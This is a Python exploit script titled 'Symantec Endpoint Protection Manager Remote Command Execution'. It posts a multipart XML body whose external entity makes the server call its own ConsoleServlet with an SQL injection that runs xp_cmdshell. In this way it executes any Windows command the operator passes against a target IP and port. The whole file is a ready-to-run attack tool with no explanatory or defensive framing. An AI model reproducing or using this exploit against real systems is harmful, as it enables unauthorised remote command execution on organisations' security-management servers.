import argparse
import httplib
 
multipart_body = \
"------=_Part_156_33010715.1234\r\n" + \
"Content-Type: text/xml\r\n" + \
"Content-Disposition: form-data; name=\"Content\"\r\n\r\n" + \
"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n" + \
"<!DOCTYPE sepm [<!ENTITY payload SYSTEM " + \
"\"http://127.0.0.1:9090/servlet/ConsoleServlet?ActionType=ConfigServer&action=test_av" + \
"&SequenceNum=140320121&Parameter=a'; call xp_cmdshell('%s');--\" >]>\r\n" + \
"<request>\r\n" + \
"<xxe>&payload;</xxe>\r\n" + \
"</request>\r\n" + \
"------=_Part_156_33010715.1234--\r\n"
headers = {'Content-Type':"multipart/form-data; boundary=\"----=_Part_156_33010715.1234\""}
 
cmdline_parser = argparse.ArgumentParser(description='Symantec Endpoint Protection Manager' + \
' Remote Command Execution')
cmdline_parser.add_argument('-t', dest='ip', help='Target IP', required=True)
cmdline_parser.add_argument('-p', dest='port', help='Target Port', default=9090, \
type=int, required=False)
cmdline_parser.add_argument('-ssl', dest='ssl', help='Uses SSL (set to 1 for true)', \
default=0, type=int, required=False)
cmdline_parser.add_argument('-c', dest='cmd', help='Windows cmd to run (must be in quotes ie "net user")', \
required=True)
args = cmdline_parser.parse_args()
 
if args.ssl == 1:
    conn = httplib.HTTPSConnection(args.ip, args.port)
else:
    conn = httplib.HTTPConnection(args.ip, args.port)
multipart_body = multipart_body % (args.cmd)
print "\n[*]Attempting to exploit XXE and run local windows command: " + args.cmd
conn.request("POST", "/servlet/ConsoleServlet?ActionType=ConsoleLog", multipart_body, headers)
res = conn.getresponse()
if res.status != 200:
    print "[-]Exploit unsuccessful! Server returned:\n" + res.read()
else:
    print "[+]Exploit successfully sent!"
